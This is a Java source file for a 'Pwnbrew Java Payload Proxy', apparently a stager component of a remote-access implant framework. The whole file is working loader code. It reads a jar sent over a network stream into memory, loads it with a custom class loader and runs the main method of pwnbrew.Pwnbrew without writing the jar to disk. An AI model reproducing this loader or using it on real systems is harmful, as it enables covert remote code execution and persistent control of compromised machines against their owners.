import java.io.DataInputStream;
import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.URISyntaxException;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.jar.JarFile;
import sun.net.www.protocol.jar.URLJarFile;


/**
 * Pwnbrew Java Payload Proxy
 */
public class Pwnbrew implements Stage {

    //The jar bytes
    private byte[] jarBytes;
    
    @Override
    public void start(DataInputStream in, OutputStream out, String[] passedParameters ) throws Exception {

        int coreLen = in.readInt();
        jarBytes = new byte[coreLen];
        in.readFully(jarBytes);
        
        //Create a URL
        URL coreURL = MemoryBufferURLConnection.createURL(jarBytes, "application/jar");  
        
        //Set the URLJarCallback
        URLJarFile.setCallBack( this );
         
        URLClassLoader aLoader = new URLClassLoader(new URL[] { coreURL }, getClass().getClassLoader());
        Method aMethod = aLoader.loadClass("pwnbrew.Pwnbrew").getMethod("main", new Class[]{ String[].class } );
        aMethod.invoke(null, new Object[]{ passedParameters });
                
        in.close();
        out.close();
    }   

    //========================================================================
    /**
     *  Return a JarFile
     * @param url
     * @return
     * @throws IOException 
     */
    @Override
    public JarFile retrieve(URL url) throws IOException {
        JarFile aFile = null;
        try {
            
            Class stagerClass = Class.forName("stager.Stager");
            URL classUrl = stagerClass.getProtectionDomain().getCodeSource().getLocation();
            
            File theJarFile = new File( classUrl.toURI() );
            aFile = new MemoryJarFile(theJarFile, jarBytes);      
            
        } catch (URISyntaxException ex) {
            System.out.println(ex.getMessage());
        } catch (ClassNotFoundException ex) {
            System.out.println(ex.getMessage());
        }
        return aFile;
    }

}
